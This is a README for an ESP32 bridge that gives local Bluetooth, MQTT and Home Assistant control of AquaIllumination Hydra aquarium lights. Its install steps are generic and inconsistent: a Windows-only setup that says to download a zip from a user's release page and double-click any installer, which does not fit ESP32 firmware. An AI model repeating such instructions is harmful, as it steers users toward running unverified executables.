---
layout: "default"
title: "🐠 hydrabridge-esp32 - Local control for your reef lights"
description: "Enable local control of AquaIllumination Hydra lights using an ESP32 for custom reef aquarium automation and interoperability."
---
# 🐠 hydrabridge-esp32 - Local control for your reef lights

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Tubb6666/hydrabridge-esp32)

hydrabridge-esp32 acts as a gateway for your AquaIllumination Hydra lights. It connects your aquarium equipment to your local home network. You control your reef lights through Bluetooth, MQTT, and Home Assistant. This project removes the need for vendor cloud services. Your setup stays private and functional even without an internet connection.

## 🛠 Features

This software provides bridge functionality for your aquarium hardware. It supports several communication protocols to ensure your reef tank stays managed.

- Local BLE control: Communicate with Hydra lights using Bluetooth signals.
- MQTT support: Integrate light status updates into your automation platform.
- Modbus and RS485: Connect industrial hardware components directly to the bridge. 
- Home Assistant discovery: Automatically detect your hardware within your dashboard.
- Offline reliability: Keep your light schedule active without cloud dependencies.

## 📋 System Requirements

Ensure your hardware meets these requirements before you begin:

- A dedicated ESP32 development board.
- A USB data cable for the ESP32 board.
- A Windows 10 or 11 computer.
- A stable 2.4GHz Wi-Fi network.
- Access to your Home Assistant instance if you plan to use advanced automation.

## 📥 Getting Started

Follow these steps to set up your light controller.

1. Visit the [official releases page](https://github.com/Tubb6666/hydrabridge-esp32) to download the necessary software.
2. Select the latest file ending in .bin or .zip.
3. Save the file to your desktop for easy access.

## 🔌 Connecting Hardware

Connect your ESP32 board to your computer using the USB cable. Ensure the cable supports data transfer, as some cables only provide charging power. Once connected, your computer recognizes the device as a new serial port.

## ⚙️ Software Installation

1. Navigate to the folder where you saved the download.
2. Open the file to view the contents.
3. Extract any compressed files to a new folder on your desktop.
4. If the folder includes an installer program, double-click it to start the setup wizard.
5. Follow the prompts on the screen to finish the installation.
6. If the file is a firmware image, use the provided flashing tool in the folder to write the code to your ESP32 board.
7. Select the correct COM port from the dropdown menu in the tool.
8. Click the Start or Flash button to begin the transfer.
9. Wait for the progress bar to show 100 percent.

## 🌐 Network Configuration

After the software installs on your ESP32 board, the device broadcasts a temporary Wi-Fi signal.

1. Open your computer Wi-Fi settings.
2. Locate the network named HydraBridge_Setup.
3. Connect your computer to this specific network.
4. Open your web browser and type 192.168.4.1 into the address bar.
5. Provide your home Wi-Fi name and password when the page loads.
6. Save your settings. The ESP32 board restarts and joins your home network.

## 🏠 Integration with Home Assistant

Verify the connection after the board restarts.

1. Open your Home Assistant dashboard.
2. Navigate to the Integrations menu.
3. Select Add Integration.
4. Search for the gateway entry.
5. Follow the steps to pair the board with your dashboard.
6. Your Hydra lights appear as new devices within your list of entities.

## 🔍 Troubleshooting

Read this section if you encounter issues during your setup.

- The device does not appear: Check your cable connection. Use a different USB port if necessary.
- Wi-Fi connection fails: Confirm your router uses a 2.4GHz connection. The ESP32 cannot use 5GHz bands.
- Light control latency: Ensure the ESP32 sits in a location with a strong Wi-Fi signal.
- Red lights on the board: Check that the power supply provides consistent voltage.
- Reset the board: Press the physical button on the ESP32 board to restart the system if it stops responding.

## 💡 Best Practices

Keep your software current for the best performance. Check the release page once a month for new updates. 

Place your ESP32 gateway away from large metal objects that might block signals. Metal blocks Bluetooth and Wi-Fi waves. A central location in your equipment cabinet usually works best. 

If you use Home Assistant, create a reserved IP address for the controller in your router settings. This prevents connection drops when your router restarts. 

Maintain a backup of your current configuration file. This allows you to restore your settings if you ever need to replace the hardware board.